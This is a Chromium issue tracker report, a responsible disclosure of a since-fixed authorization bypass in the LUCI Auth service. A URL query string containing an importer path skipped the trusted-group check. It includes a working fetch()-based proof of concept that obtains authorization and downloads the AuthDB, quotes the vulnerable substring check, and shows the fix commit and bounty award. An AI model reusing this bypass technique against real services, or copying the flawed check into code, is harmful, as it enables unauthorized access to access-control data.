# LUCI Auth service "auth-trusted-services" group bypass

| Field | Value |
|-------|-------|
| **Issue ID** | [344081614](https://issues.chromium.org/issues/344081614) |
| **Status** | Accepted |
| **Severity** | S4-Minimal |
| **Priority** | P3 |
| **Component** | Infra>LUCI |
| **Platforms** | Windows |
| **Chrome Version** | 125.0.0.0 |
| **Reporter** | nd...@protonmail.com |
| **Assignee** | ar...@google.com |
| **Created** | 2024-06-02 |
| **Bounty** | $1,000.00 |

## Description

# Steps to reproduce the problem

- Login to this URL as any normal google user.
  <https://accounts.google.com/o/oauth2/v2/auth?gsiwebsdk=3&client_id=446450136466-tmlcmovb9hnoh8rhs39846vmmd0rrsl0.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email&redirect_uri=https%3A%2F%2Fdefaultv2-dot-chrome-infra-auth.appspot.com%2Fauth%2Fopenid%2Fcallback&prompt=select_account&response_type=token&include_granted_scopes=false&enable_granular_consent=true>
- Copy the `access_token` value from the url hash.
- On that same page, run the following

```
fetch("https://defaultv2-dot-chrome-infra-auth.appspot.com/auth_service/api/v1/authdb/subscription/authorization?x=/auth_service/api/v1/importer/ingest_tarball/", {
  "headers": {
    "authorization": "Bearer <token goes here>",
  },
  "referrerPolicy": "strict-origin-when-cross-origin",
  "method": "POST",
  "mode": "cors"
});

```

You should now be granted permission to luci-go AuthDB without being in the "auth-trusted-services" group needed as per <https://pkg.go.dev/go.chromium.org/luci/server/auth/service#AuthService.RequestAccess>

`{"topic":"projects/chrome-infra-auth/topics/auth-db-changed","authorized":true,"gs":{"auth_db_gs_path":"chrome-infra-auth.appspot.com/auth-db","authorized":true}}`

You can also use the API to download the DB.

```
fetch("https://defaultv2-dot-chrome-infra-auth.appspot.com/auth_service/api/v2/authdb/revisions/latest?x=/auth_service/api/v1/importer/ingest_tarball/", {
  "headers": {
    "authorization": "Bearer <token>",
  },
  "referrerPolicy": "strict-origin-when-cross-origin",
  "method": "GET",
  "mode": "cors"
});

```

The bypass is the that if the URL contains `/auth_service/api/v1/importer/ingest_tarball/` anywhere the permission check gets bypassed.
Code is `strings.Contains(ctx.Request.URL.RequestURI(), "/auth_service/api/v1/importer/ingest_tarball/")`
Otherwise I would get `{"text":"user:ndevtk@protonmail.com is not a member of auth-trusted-services or administrators"}`

# Problem Description

Attacker gains LUCI AuthDB, not looked what it does incase its confidential.

# Summary

LUCI Auth service "auth-trusted-services" group bypass

# Additional Data

Category: Security   

Chrome Channel: Not sure   

Regression: N/A

## Timeline

### za...@google.com (2024-06-03)

Hi renewitt@ and jsca@ can you please take a look at this LUCI api issue? It's reported to Chrome security, please take a look and help triage. Thank you. 

### za...@google.com (2024-06-03)

Setting it to Security impact none and set found in as 124. Passing it to LUCI team to take a look.

### js...@google.com (2024-06-03)

Thanks for the report. Anne, this looks like a bug in v2, could you take a look please?

### ap...@google.com (2024-06-04)

Project: infra/luci/luci-go
Branch: main

commit 5c15025956f2316f8f4722e6961e3763aa647b25
Author: Anne Redulla <aredulla@google.com>
Date:   Tue Jun 04 01:35:50 2024

    [auth-service] Improve ingest endpoint check
    
    Also checks the caller's eligiblity to subscribe for double-
    layered checking.
    
    Bug: b/344081614
    Change-Id: I0b7454dfbf1feca2b53e749b921530bc09bb1e5a
    Reviewed-on: https://chromium-review.googlesource.com/c/infra/luci/luci-go/+/5595490
    Reviewed-by: Joey Scarr <jsca@google.com>
    Commit-Queue: Anne Redulla <aredulla@google.com>

M       auth_service/services/frontend/main.go
M       auth_service/services/frontend/subscription/handler.go
M       auth_service/services/frontend/subscription/handler_test.go

https://chromium-review.googlesource.com/5595490


### nd...@protonmail.com (2024-06-04)

Thanks this looks fixed now :)  
That was quick.

### nd...@protonmail.com (2024-07-02)

https://defaultv2-dot-chrome-infra-auth.appspot.com/ has no embed protection or provide a SameSite value, is there a clickjacking concern at least for firefox?

### ar...@google.com (2024-07-18)

Thanks for highlighting the clickjacking issue - this should now be fixed. I made a separate follow-up bug and then forgot to update this one.

### nd...@protonmail.com (2024-07-18)

Patch: <https://chromium-review.googlesource.com/c/infra/luci/luci-go/+/5674200>  

Interested to see if VRP award this report, guessing infra is more Google VRP.

### sp...@google.com (2024-08-02)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
$1,000 for report of lower impact user information disclosure


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-08-02)

While this technically falls out of our scope, as this is not a security issue in the browser, this does impact our overall infra so we did feel it appropriate for us to extend a reward here.
Thank you for your report, NDevTK -- we appreciate your efforts and reporting this issue to us!

### nd...@protonmail.com (2024-08-02)

Thanks :)

I should give up with reporting clickjacking its never worked, I would test the features but that's harder with internal features.

### pe...@google.com (2024-09-11)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/344081614)*
